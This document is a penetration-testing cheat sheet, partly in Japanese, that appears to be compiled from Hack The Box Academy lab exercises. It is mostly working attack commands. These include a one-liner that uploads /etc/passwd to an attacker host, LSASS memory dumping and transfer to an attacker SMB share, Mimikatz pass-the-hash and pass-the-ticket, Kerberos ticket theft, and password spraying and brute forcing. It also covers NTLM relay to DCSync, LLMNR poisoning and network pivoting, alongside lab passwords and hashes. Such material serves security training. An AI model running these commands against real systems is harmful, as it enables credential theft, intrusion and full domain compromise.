# Cheet Sheet

### LDAPの識別名
CN=グループ名,CN=コンテナ名,DC=ドメイン名,DC=トップレベルドメイン

## Site

### Reverse Shell Generator
https://www.revshells.com/

### Crack password on website
https://crackstation.net/

### Sans SMBClient Cheat Sheet
https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf

### Windows PowerView Cheet Sheet
https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet

## Crawling
### python
python3 ReconSpider.py http://inlanefreight.com

## Upload
### python 1-liner
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

## Fuzzing

### fuff
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://94.237.48.60:57525/ -H "Host: FUZZ.inlanefreight.htb" -fs 116

### Gobuster
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

## Payload
cheetsheet1:[https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/]
cheetsheet2:[https://github.com/swisskyrepo/PayloadsAllTheThings]
cheetsheet3:[https://gtfobins.github.io]

## Privilege Escalation
LinPEAS

## Upgrade Shell
python -c 'import pty; pty.spawn("/bin/bash")'

## Nmap

### Convert results of nmap into html
nmap -sC -sV 10.10.10.10 -oX taregt.xml
xsltproc target.xml -o target.html

## SMB
smbclient -N -L //<FQDN/IP>
smbclient //<FQDN/IP>/<share>

## RPClient
rpcclient -U "" <FQDN/IP>
srvinfo
### Brute Forcing User RIDs
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

## NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock

## DNS
### Bruteforce to search subdomain
dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>

## SMTP
### Existing User 
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target_ip>
set USER_FILE /path/to/userlist.txt
run

## IMAP/POP3
### nmap specific port
nmap -sV -sC 10.129.160.110 -p110,143,993,995

### Search the mailbox on the imapserver 
a004 FETCH 1:* (BODY.PEEK[HEADER.FIELDS (FROM SUBJECT)])
### If you find the above command read the full mail including custom header
a004 FETCH 1 (RFC822)

## MS-SQL
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.149.195
### Connect with pyhon
impacket-mssqlclient backdoor:Password1@10.129.149.195 -windows-auth

## Oracle-TNS
sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute

### Windows RDP
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!

## Find shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

## Password Craking

### BitLocker
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt

### WinRM
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

### ssh
hydra -L user.list -P password.list ssh://10.129.42.197

### RDP
netexec winrm <ip> -u user.list -p password.list

### RDP(with admin) DisableRestrictedAdmin レジストリキーの追加
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

### Default Credentials
https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv

## Attacking LSASS
### Creatting dump file on powershell
PS C:\Windows\system32> Get-Process lsass # To check PID
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full 
### Download from target
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/ # Attacking machine
PS C:\Windows\system32> move C:\lsass.dmp \\10.10.14.184\CompData # Target machine
### Extract Credential
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
### Cracking the NT Hash
sudo hashcat -m 1000 <NT Hash> /usr/share/wordlists/rockyou.txt

### Capture the NTDS.dit
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

### Firefox decrypt
git clone https://github.com/unode/firefox_decrypt?tab=readme-ov-file
python3.9 firefox_decrypt.py


### Mimikatz - Export Windows tickets
mimikatz.exe
privilege::debug
sekurlsa::tickets /export

### Mimikatz - Extract Kerberos keys
mimikatz.exe
privilege::debug
sekurlsa::ekeys

### Mimikatz - Pass the Key aka. OverPass the Hash
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:john /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

### Mimikatz - Pass the Ticket
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

### Finding KeyTab files
find / -name *keytab* -ls 2>/dev/null # need privileges
crontab -l # possibly included files hint

### Finding ccachse files
env | grep -i krb5

### Impersonating a user with a KeyTab
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

### Extracting KeyTab hashes with KeyTabExtract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

### Importing the ccache file into our current session
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

### Evil-winrm with nltk hash
evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c

### Linikatz (Linikatz brings a similar principle to Mimikatz to UNIX environments)
[!bash!]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
[!bash!]$ /opt/linikatz.sh

## Shadow Credentials (msDS-KeyCredentialLink)
### wwhiteの認証情報を使って、jpinkmanのアカウントに公開鍵を登録
pywhisker --dc-ip 10.129.43.32 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add]
### 偽造した証明書を使って、jpinkmanのKerberos認証チケット（TGT）を取得
python3 gettgtpkinit.py -cert-pfx ./2dTwvsdf.pfx -pfx-pass 'jtbu8vTGJBGSkA4jtx2S' -dc-ip 10.129.43.32 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
### /etc/krb5.confを編集して、ドメインとKDCの情報を設定
### kdc = 10.129.43.32 と設定することで、ホスト名解決の問題を回避
### 
### Kerberos認証チケットのパスを指定
export KRB5CCNAME=/tmp/jpinkman.ccache
### TGTを使って、jpinkmanとしてドメインコントローラーにリモート接続
### /etc/hostsも編集してDNS解決を補助
evil-winrm -i 10.129.43.32 -r INLANEFREIGHT.LOCAL

## AD CS NTLM Relay Attack (ESC8)
### AD CSサーバーをターゲットに、認証中継サーバーを起動
impacket-ntlmrelayx -t http://10.129.227.10/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
### ドメインコントローラーに、攻撃者のマシンへの認証を強制
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.53.88 <attacker_ip>
### 取得したドメインコントローラーのTGTを使って、DCSync攻撃を実行
impacket-secretsdump -k -no-pass -dc-ip 10.129.180.85 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
### 抜き出したAdministratorのNTLMハッシュを使って、リモート接続
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c Administrator@10.129.53.88

### RDPで接続したWindowsとファイルをやりとりする方法
proxychains xfreerdp /v:172.16.119.7 /u:hwilliam /p:dealer-screwed-gym1 /drive:tools,/home/htb-ac-1937176/tools

### lindigo
-attacker host
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
python3 -m http.server
-target host
wget http://PWNIP:8000/agent
-attacker host
sudo ./proxy -selfcert
-target host
chmod +x ./agent ; ./agent -connect PWNIP:11601 --ignore-cert
-attacker host
session
autoroute

### SMB Enumuration
./enum4linux-ng.py 10.10.11.45 -A -C

### サブドメインの列挙
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt

### DIG - MX Records
dig mx plaintext.do | grep "MX" | grep -v ";"

### Password attack to smtp, pop3
hydra -l 'marlin@inlnanefreight.htb' -P ./pws.list -f 10.129.203.12 smtp

### MSSSQL
###　ローカルファイルを読み取る
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Content
### リンクサーバーを確認する
SELECT srvname, isremote FROM sysservers
### Imperonate可能なユーザーを見つける
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE

### windows port proxy
### find internal ip
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply" 
### port proxy
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25


### Chisel
### Server side
./chisel server -v -p 1234 --socks5
### Client side
./chisel client -v 10.129.202.64:1234 socks

### ネットワーク内でアクティブなホストを検証
fping -asgq 172.16.5.0/23

### LinuxからのLLMNR/NBT-NS ポイズニング
sudo responder -I ens224 
### WindowsからのLLMNR/NBT-NS ポイズニング
PS C:\htb> Import-Module .\Inveigh.ps1 #ps版はすでに保守されておらず、C#版が保守されているとのこと。自分でbuildする必要がある。
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y　

### Enumerate valid usernames using Kerbrute
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

### Linux Domain Passwordspray
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

### Windows Domain Passwordspray
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

### RIDによるRPCClientユーザー列挙
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers

### admin権限を持っているが無効化されているuser account
dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -limit 5 -attr SAMAccountName description

### GetUserSPNs.py で SPN アカウントを一覧表示する
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs # ユーザーを指定して出力ファイルも指定

### Windows:Enumerating SPNs with setspn.exe
setspn.exe -Q */*

### Check the user have rights to other's user.
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

### Check user in the group
PS C:\htb> $sid = Convert-NameToSid "forend"
PS C:\htb> Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}

### Check reverse password accounts
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

### WinRM from windows
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred